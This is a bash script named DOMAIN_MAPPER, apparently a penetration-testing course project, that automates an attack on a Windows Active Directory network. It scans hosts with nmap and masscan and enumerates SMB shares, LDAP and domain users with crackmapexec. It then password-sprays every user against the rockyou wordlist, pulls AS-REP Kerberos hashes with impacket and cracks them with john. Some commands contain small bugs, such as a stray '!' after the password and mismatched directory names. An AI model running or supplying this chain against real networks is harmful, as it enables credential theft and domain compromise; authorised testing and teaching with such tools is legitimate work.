#!/bin/bash


figlet "DOMAIN_MAPPER"
echo "by yaron shagalov"
echo 


HOME=$(pwd)


#help menu to help users understand how to use this tool effectively.
function HELP ()
{   
    echo """
**********************************************************************************************************
-------------------------------------------- HELP MENU ---------------------------------------------------
                
    SCANNING OPTIONS:
    1. Basic:
       - 'nmap -Pn <target>' (Skip host discovery).
    2. Intermediate:
       - 'nmap -p- <target> -Pn -sV --open' (Scan all open ports).
    3. Advanced:
       - 'masscan -pU:1-65535 -iL <targets> --rate=1000' (Include UDP scanning).

----------------------------------------------------------------------------------------------------------
    ENUMERATION OPTIONS:
    1. Basic:
       - 'nmap -sV <target>' (Identify services).
       - Identify the IP Address of the Domain Controller.
       - Identify the IP Address of the DHCP server.

    2. Intermediate:
       - Enumerate IPs for FTP, SSH, SMB, WinRM, LDAP, RDP.
       - 'smbmap' (Enumerate shared folders).
       - NSE scripts: 'os-discovery', 'ldap-search', 'ftp-anon'.

    3. Advanced (if AD creds provided):
       - Extract users, groups, and shared folders (using crackmapexec).
       - Display password policy.
       - Find disabled/never-expired accounts, Domain Admins group members.

----------------------------------------------------------------------------------------------------------
    EXPLOITATION OPTIONS:
    1. Basic:
       - Deploy the NSE vulnerability scanning script ('nmap --script=vuln').
    2. Intermediate:
       - Execute domain-wide password spraying to identify weak credentials (using crackmapexec).
    3. Advanced:
       - Extract and attempt to crack Kerberos tickets using pre-supplied passwords (using impacket).

**********************************************************************************************************
"""
}

if [ "$1" == "-h" ] || [ "$1" == "--help" ]
then 
    HELP
fi

#Zip the results 
function ZIP_RES()
{
        echo "[#] Zipping the results directory..."
        cd SCAN_RES
    
        zip -r "$DTA.zip" "$DTA"  > /dev/null
        echo "[+] Results successfully zipped: $DTA.zip"

        if [ -f "$DTA.zip" ]; then
            echo "[+] Results successfully zipped: $DTA.zip"
            echo
            sleep 1
        else
            echo "[!] Failed to zip the results."
            echo
            sleep 1
        fi
        echo "[#] We are done exiting...."
        sleep 3
        exit
         

}

#user need to enter the target network range for scanning and Make sure the input is valid.
function USER_INPUT() 
{
    while true; do
        read -p "[+] Please enter the network range you would like to scan in CIDR notation (your IP is $( ifconfig | grep inet | awk '{print $2}' |head -1)): " RENG

    # Validate the input
        if [[ ! "$RENG" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}$ ]] && [[ ! "$RENG" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            echo "[!] Error: Invalid input format. Please enter a valid IP address (e.g., 192.168.1.0/24) or a single IP address."
        else
            break  # Exit the loop if a valid input is provided
        fi
    done

    # Check if it's a single IP or a network range
    if [[ "$RENG" =~ / ]]; then
        echo "  [>] Scanning network range: $RENG"

    else
        echo "  [>] Scanning single IP: $RENG"

    fi

    #User should enter Domain name and Active Directory (AD) credentials.
	read -p "[+] Please enter Domain name: " DNAME
	read -p "[+] If given enter active domain username (if not leave empty): " ADUSER
	read -s -p "[+] If given enter active domain password (if not leave empty): " ADPASS
	echo ""

    #Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
       read -e -p "[+] Please provide a password list or leave blank to use default list: " PASSANS
    if [ "$PASSANS" == '' ];then
        echo "[+] Using default list: /usr/share/wordlists/rockyou.txt"
        PASSLIST='/usr/share/wordlists/rockyou.txt '
        sleep 1
    elif ! [ -f "$PASSANS" ];then
        echo " [*] file not found using defult file."
        sleep 1
        PASSLIST='/usr/share/wordlists/rockyou.txt '
    else 
        PASSLIST=$(echo "$PASSANS")
    fi
    MKDIR
}

#Making directory for the results
function MKDIR()
{
    read -p "[+] Enter a directory to save the data: " DTA
    echo "[*] Checking if the directory exists....."

    if [ -d "SCAN_RES/$DTA" ]; then
        echo "[!] Directory already exists... continuing"
        sleep 0.5
    else 
        echo "[*] Directory does not exist... creating"
        mkdir -p SCAN_RES/$DTA || { echo "Failed to create directory SCAN_RES/$DTA"; exit 1; }
        echo "[*] The results will be saved to $HOME/SCAN_RES/$DTA"   
        sleep 0.5    
    fi 

    DIRPATH=$(echo "$HOME/SCAN_RES/$DTA")  
        
}

function START()
{
    #CHECK IF THE USER ROOT
    if [ "$(whoami)" != "root" ]; then
        echo "[!] Must be root to run this script. Exiting..."
        exit 1
    fi
    
    USER_INPUT

}
START


#Scanning mode(basic/intermediate/advanced)

function BASIC_SCANN()
{
    echo
    echo "*****Starting the process... it my take some time*****"
    echo
    echo "[*] Basic scan chosen, performing the scan....";
    nmap $RENG -Pn --open  | tee $DIRPATH/NMAP_RES > /dev/null 2>&1
	cat $DIRPATH/NMAP_RES | grep 'report for' | awk '{print $NF}' > $DIRPATH/ONLINE_HOSTS  
	

}

function INTERMEDIATE_SCANN()
{ 
	
	echo "[*] Intermediate scan chosen, performing the scan....";
	for i in $(cat $DIRPATH/ONLINE_HOSTS); do 
        nmap -p- $i -Pn -sV --open -oN $DIRPATH/NMAP_$i.txt  > /dev/null 2>&1
    done
 

}

function ADVANCED_SCANN()
{ 
	
	echo "[*] Advanced scan chosen, performing the scan....";
	masscan -pU:1-65535  -iL $DIRPATH/ONLINE_HOSTS --rate=1000 -oL $DIRPATH/UDP_RES.txt > /dev/null 2>&1
    echo
}

#Enumeration modes (basic/intermediate/advanced)
function BASIC_ENUMERATION()
{ 
#Identify services (-sV) running on open ports.
    echo "[*] Done scaning, continiung...." 
    echo
	echo "[#] Basic Enumeration chosen, performing the enumeration..."
	
	   echo "[#] Checking for open LDAP ports..."
    for F in $DIRPATH/NMAP_*; do
        echo "[*] Checking file: $F"
        if grep -q 'ldap' "$F"; then
           echo "[+] Open LDAP ports found in file: $F"
           echo "[-] $F" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' >> $DIRPATH/DOMAIN_IP.txt
           echo " [->] DOMAIN IP : $(cat $DIRPATH/DOMAIN_IP.txt)"

        else
            echo "[!] No open LDAP ports found in file: $F"
            
        fi
    done
    
    echo "[#] Checking for open DNS ports..."
    
    for F in $DIRPATH/NMAP_*; do
        echo "[*] Checking file: $F"
        if grep -q 'DNS' "$F"; then
            echo "[+] Open DNS ports found in file: $F"
           echo "$F" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' >> $DIRPATH/DNS_SERVER_IP.txt
           echo " [->] DNS SERVER IP: $(cat $DIRPATH/DNS_SERVER_IP.txt)"

        else
            echo "[!] No open DNS ports found in file: $F"
            
            

        fi
    done
	
		echo "[#] Checking for open DHCP ports..."

	    for F in $DIRPATH/NMAP_*; do
        echo "[*] Checking file: $F"
        if grep -q 'dhcp' "$F"; then
            echo "[+] Open DHCP ports found in file: $F"
           echo "$F" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' >> $DIRPATH/DHCP_SERVER_IP.txt
           echo " [->] DHCP SERVER IP: $(cat $DIRPATH/DHCP_SERVER_IP.txt)"

        else
            echo "[!] No open DHCP ports found in file: $F"
            
            

        fi
    done
}

function INTERMEDIATE_ENUMERATION()
{ 
    echo
	echo "[*] Intermediate Enumeration chosen, performing the enumeration...."

    services=("ftp" "ssh" "microsoft-ds" "ldap" "ms-wbt-server" "winrm")

        for F in $DIRPATH/NMAP_*; do
                echo "[*] Checking file for key services: $F"
            if grep -qE 'ftp|ssh|microsoft-ds|ldap|ms-wbt-server|winrm' "$F"; then
                echo " [+] Key service port found in IP:"
                    grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' <<< "$F"
            else
                echo "[!] No key service port found in IP:"
                    grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' <<< "$F"
        fi
done

#Enumerate shared folders.
#Extract all shares.
#Check if ADUSER and ADPASS are not empty if the user did not give credentials then try Anonymous login

if [ -n "$ADUSER" ] && [ -n "$ADPASS" ] &&  [ -f "$DIRPATH/DOMAIN_IP.txt" ] && [ -s "$DIRPATH/DOMAIN_IP.txt" ]; then

    echo "[#] Enumerate shared folders:"
	for ip in $(cat "$DIRPATH/DOMAIN_IP.txt"); do smbmap -u $ADUSER -p $ADPASS -H "$ip"  | tee -a $DIRPATH/SHARED_FOLDERS  ;done > /dev/null 2>&1
else
    echo "[#] Attempting Anonymous login to shared folders:"
	for ip in $(cat "$DIRPATH/DOMAIN_IP.txt"); do smbclient -N -L "//${ip}"  | tee -a $DIRPATH/DOMAIN_IP_ANONYMOUS ;done > /dev/null 2>&1
fi

#Three (3) NSE scripts you think can be relevant for enumerating domain networks.
	echo ""
	echo "NSE scripts for domain enumeration:"
    echo "***** 1. os-discovery.nse - Identifies the OS running on a target *****"
    echo "***** 2. ldap-search.nse - Performs an LDAP search and returns matches *****"
    echo "***** 3. ftp-anon.nse - Checks for anonymous FTP login capabilities *****"    
    echo ""
   
    echo "[#] Running NSE scripts for enumeration.... "
     mkdir -p $DIRPATH/NSE_SCRIPTS > /dev/null 2>&1
	 echo "[+] Runing NSE scripts...."

	for i in $(cat $DIRPATH/ONLINE_HOSTS); do nmap -Pn -p 445 --script smb-os-discovery.nse $i | tee -a $DIRPATH/NSE_SCRIPTS/OS_DISCOVERY > /dev/null 2>&1 ;sleep 0.1 ;done

	for i in $(cat $DIRPATH/ONLINE_HOSTS); do nmap -Pn -p 389 --script ldap-search.nse $i | tee -a $DIRPATH/NSE_SCRIPTS/LDAP_SEARCH > /dev/null 2>&1 ;sleep 0.1 ;done

	for i in $(cat $DIRPATH/ONLINE_HOSTS); do nmap -Pn -p 21 --script ftp-anon.nse $i | tee -a $DIRPATH/NSE_SCRIPTS/FTP_ANON > /dev/null 2>&1 ;sleep 0.1 ;done
	
    echo "[*] Done NSE scann...."

}

function ADVANCED_ENUMERATION()
{
	
TEMP_USERS=$(mktemp -t users_XXXX.lst)
TEMP_DISABLED_USERS=$(mktemp -t disabled_users_XXXX.lst)
TEMP_NEVER_EXPIRED_USERS=$(mktemp -t never_expired_users_XXXX.lst)

mkdir -p $DIRPATH/GROUPS_AND_USERS #> /dev/null 2>&1

	#Extract all users
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS --users >> $TEMP_USERS ; done
	echo "[+] Users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_USERS; then echo "[!] Failed to extract users."; else cat $TEMP_USERS | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}' | tee $DIRPATH/GROUPS_AND_USERS/USERS.txt ; fi
	echo ""

	#Extract all groups
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS --groups >> $DIRPATH/GROUPS_AND_USERS/GROUPS.txt ; done
	echo "[+] Groups found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/GROUPS_AND_USERS/GROUPS.txt; then echo "[!] Failed to extract groups."; else echo "$DIRPATH/GROUPS_AND_USERS/GROUPS.txt:"  ; fi
	echo ""

	#Display password policy
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS --pass-pol >> $DIRPATH/GROUPS_AND_USERS/PASS_POL.txt ; done
	echo "[+] Password policy found:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/GROUPS_AND_USERS/PASS_POL.txt; then echo "[!] Failed to retrieve password policy."; else echo "$(cat $DIRPATH/GROUPS_AND_USERS/PASS_POL.txt | grep -A 20 'Dumping password info for domain' | grep -E 'Minimum password length|Password history length|Maximum password age|Password Complexity Flags|Minimum password age|Reset Account Lockout Counter|Locked Account Duration|Account Lockout Threshold|Forced Log off Time')"  ; fi
	echo ""

	#Find disabled accounts
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS! -X "powershell -command \"Get-ADUser -Filter {Enabled -eq \$false} -Properties samAccountName | Select-Object samAccountName\"" >> $TEMP_DISABLED_USERS ; done
	echo "[+] Disabled users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_DISABLED_USERS; then echo "[!] Failed to find disabled users."; else cat $TEMP_DISABLED_USERS | sed -n '/samAccountName/{n; n; p; :a; n; p; ba}' | awk '{print $NF}' | tee $DIRPATH/GROUPS_AND_USERS/DISABLED_USERS.txt  ; fi
	echo ""

	#Find never-expired accounts
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS! -X "powershell -command \"Get-ADUser -Filter {PasswordNeverExpires -eq \$true} -Properties samAccountName | Select-Object samAccountName\"" >> $TEMP_NEVER_EXPIRED_USERS ;  done
	echo "[+] Never expired users found in the domain:" ; if grep -q "STATUS_LOGON_FAILURE" $TEMP_NEVER_EXPIRED_USERS; then echo "[!] Failed to find never-expired users."; else cat $TEMP_NEVER_EXPIRED_USERS | sed -n '/samAccountName/{n; n; p; :a; n; p; ba}' | awk '{print $NF}' | tee $DIRPATH/GROUPS_AND_USERS/only_never_expired_users.txt  ; fi
	echo ""

	#Display accounts that are members of the Domain Admins group
	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $ADUSER -p $ADPASS --groups "Administrators" >> $DIRPATH/GROUPS_AND_USERS/ADMIN_GROUP.txt ; done
	echo "[+] Members of the Domain Admins group:" ; if grep -q "STATUS_LOGON_FAILURE" $DIRPATH/GROUPS_AND_USERS/ADMIN_GROUP.txt; then echo "[!] Failed to retrieve Domain Admins group members."; else echo "$(cat $DIRPATH/GROUPS_AND_USERS/ADMIN_GROUP.txt | grep -oP '\b[a-zA-Z0-9_.-]+\\[a-zA-Z0-9_.-]+' | awk -F '\\' '{print $2}')"  ; fi
	echo 

}

#Exploitation mode (basic/intermediate/advanced)
function BASIC_EXPLOITATION()
{
	  echo "[#] Performing Basic Exploitation..."

    # Check if the Online_hosts file exists and is not empty
    if [ -f "$DIRPATH/ONLINE_HOSTS" ] && [ -s "$DIRPATH/ONLINE_HOSTS" ]; then
        # Create the NSE_SCRIPTS directory if it doesn't exist
        mkdir -p $DIRPATH/NSE_SCRIPTS

        for i in $(cat "$DIRPATH/ONLINE_HOSTS"); do
            echo "[*] Scanning host: $i"
            nmap --script=vuln "$i" -Pn | tee -a "$DIRPATH/NSE_SCRIPTS/VULN_SCRIPT" > /dev/null 2>&1
        done

        echo "[#] Basic Exploitation Completed."
    else
        echo "[!] The file $DIRPATH/ONLINE_HOSTS does not exist or is empty."
    fi
 }
 
 #Execute domain-wide password spraying to identify weak credentials.
function INTERMEDIATE_EXPLOITATION()
{ 
	echo "[#] Performing Intermediate Exploitation...";
    echo
	mkdir -p $DIRPATH/PASSWORD_SPRAYING > /dev/null 2>&1

	for i in $(cat $DIRPATH/DOMAIN_IP.txt); do crackmapexec smb $i -u $DIRPATH/GROUPS_AND_USERS/USERS.txt -p $PASSLIST --continue-on-success  >> $DIRPATH/PASSWORD_SPRAYING/CRACK_USR.txt  ;sleep 0.1 ;done
	cat $DIRPATH/PASSWORD_SPRAYING/CRACK_USR.txt | grep "[+]" | awk '{print $6}' | sed 's/:/ password: /g' | sed 's/\\/ user: /g' | tee $DIRPATH/PASSWORD_SPRAYING/ONLY_CRACK_USR.txt 
    echo 
}

function ADVANCED_EXPLOITATION()
{

	echo "[#] Performing Advanced Exploitation...";
	echo "[!] Chacking for impacket...."
    sleep 1

	REQUIREMENTS=("impacket")

    for package_name in "${REQUIREMENTS[@]}"; do
        if ! pip show "$package_name" >/dev/null 2>&1; then
            echo -e "[*] Installing $package_name..."
            if pip install "$package_name" >/dev/null 2>&1; then
                echo "[#] $package_name installed."
            else
                echo "[!] Failed to install $package_name (try updating)."
            fi
        else
            echo "[#] $package_name is already installed."
        fi
    done
    
TEMP_KERB_USERS=$(mktemp -t kerb_users_XXXX.lst)


mkdir  $DIRPATH/KRB > /dev/null 2>&1

impacket-GetNPUsers "$DNAME/" -usersfile $DIRPATH/GROUPS_AND_USERS/USERS.txt -dc-ip $(cat $DIRPATH/DOMAIN_IP.txt) -request | tee $TEMP_KERB_USERS | grep -F "$" | sed 's/\$/\n\$/g' 


cat $TEMP_KERB_USERS | grep -F "$" | sed 's/\$krb5asrep/\n\$krb5asrep/g' | awk -v dirpath="$DIRPATH/kerb/" '/\$krb5asrep/ {counter++} {print > (dirpath "/ticket" counter ".txt")}'
 
for i in $(echo $DIRPATH/KRB/ticket*.txt); do john --format=krb5asrep --wordlist=$PASSLIST $i  ;sleep 0.1 ;done > /dev/null 2>&1

echo 
echo "[*] Passwords managed to be cracked:" > /dev/null 2>&1
john --show $DIRPATH/KRB/ticket*.txt | tee -a $DIRPATH/KRB/KRB_cracked.txt
echo
}

#Get operation level from the user
#Require the user to select a desired operation levelBasic, Intermediate, Advanced or None
echo "[?] Choose the operation level for each mode before any actions are executed."

echo "  [1] Basic"
echo "  [2] Intermediate"
echo "  [3] Advanced"
echo 
read -p "[*] Select operation level for Scanning Mode (1-3): " scanning_choice
read -p "[*] Select operation level for Enumeration Mode (1-3): " enumeration_choice
read -p "[*] Select operation level for Exploitation Mode (1-3): " exploitation_choice

#Execute Scanning 
case $scanning_choice in
    1) BASIC_SCANN ;;
    2) BASIC_SCANN
    INTERMEDIATE_SCANN ;;
    3) BASIC_SCANN 
    INTERMEDIATE_SCANN
	ADVANCED_SCANN ;;
    *) echo "[!] Invalid Scanning choice. Exiting."; exit 1 ;;
esac

#Execute Enumeration
case $enumeration_choice in
    1) BASIC_ENUMERATION ;;
    2) BASIC_ENUMERATION
    INTERMEDIATE_ENUMERATION ;;
    3) BASIC_ENUMERATION
    INTERMEDIATE_ENUMERATION
    ADVANCED_ENUMERATION ;;
    *) echo "[!] Invalid Enumeration choice. continue without Enumeration." ;;
esac

#Execute Exploitation
case $exploitation_choice in
    1) BASIC_EXPLOITATION ;;
    2) BASIC_EXPLOITATION 
    INTERMEDIATE_EXPLOITATION ;;
    3) BASIC_EXPLOITATION
    INTERMEDIATE_EXPLOITATION
    ADVANCED_EXPLOITATION ;;
    *) echo "[!] Invalid Exploitation choice.continue without Exploitation." ;;
esac


#Save files to PDF format
#Check if enscript is install, if not install it.
PDF_REQUIREMENTS=("enscript")

echo "[!] Checking if enscript is installed...."

for package_name in "${PDF_REQUIREMENTS[@]}"; do
    if ! dpkg -l | grep -q "$package_name"; then
        echo -e "[*] Installing $package_name..."
        if sudo apt-get install -y "$package_name" >/dev/null 2>&1; then
            echo "[#] $package_name installed."
            echo
        else
            echo "[!] Failed to install $package_name (try updating)."
        fi
    else
        echo "[#] $package_name is already installed."
        echo
    fi
done

echo "[++] making a PDF file of the script outpot"

cat $DIRPATH/NMAP_RES \
    $DIRPATH/UDP_RES.txt \
    $DIRPATH/SHARED_FOLDERS \
    $DIRPATH/GROUPS_AND_USERS/* \
    $DIRPATH/KRB/KRB_cracked.txt \
    $DIRPATH/NSE_SCRIPTS/* \
    $DIRPATH/PASSWORD_SPRAYING/ONLY_CRACK_USR.txt \
    |enscript -p - | ps2pdf - $DIRPATH/RESULTS.pdf > /dev/null 2>&1
    ZIP_RES


